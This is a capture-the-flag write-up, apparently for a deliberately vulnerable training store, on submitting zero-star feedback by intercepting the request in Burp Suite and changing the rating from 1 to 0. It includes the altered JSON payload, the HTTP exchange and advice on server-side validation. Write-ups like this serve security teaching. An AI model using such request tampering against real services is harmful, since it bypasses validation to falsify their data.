# Zero Stars

**Category:** Improper Input Validation  
**Difficulty:** ⭐  
**Assignee:** Emmanuel Oshike  
**Status:** [x] Completed  

## Objective
Give a devastating zero-star feedback to the store.

## Tools Used
* Burp Suite Community Edition
* Firefox web browser

## Analysis & Approach
The application interface forces users to select at least one star (a 1 to 5 rating) when submitting customer feedback. The submit button remains disabled if no stars are selected. Because client-side validation can easily be bypassed, I planned to intercept the API request using a proxy and modify the rating value before it reaches the backend server.

## Steps to Reproduce
1. Navigate to the Customer Feedback page (`/#/contact`).
2. Fill out the "Author" and "Comment" fields.
3. Select a 1-star rating so the "Submit" button becomes active.
4. Turn on intercept in Burp Suite and click "Submit".
5. In Burp Suite, locate the JSON body of the POST request sent to `/api/Feedbacks/`.
6. Change the `"rating": 1` key-value pair to `"rating": 0`.
7. Forward the modified request to the server. 
8. The server accepts the payload, and the success flag is triggered on the Score Board.

## Proof of Concept (PoC)

**Payload Used:**
```json
{
  "captchaId": 12,
  "captcha": "38",
  "comment": "I think I like this.",
  "rating": 0
}
```
**Request/Response Snippet:**
```json
POST /api/Feedbacks/ HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Authorization: Bearer <token>

{"captchaId":12,"captcha":"38","comment":"I think I like this.","rating":0}

HTTP/1.1 201 Created
Content-Type: application/json

{"status":"success","data":{"id":15,"comment":"I think I like this.","rating":0}}
```
`![Screenshot of successful exploitation](../../assets/images/zero-stars-success.png)`

## Root Cause & Remediation
**Why did this happen?**
The backend API explicitly trusts the data provided by the client without enforcing its own boundary checks. While the frontend Angular code restricts the minimum value to 1, the backend Node.js route does not validate if the rating integer falls within the expected 1-5 range before inserting it into the database.

**How to fix it:**
* Implement strict server-side input validation on the /api/Feedbacks/ endpoint.
* Reject any POST request where the rating attribute is not an integer between 1 and 5.
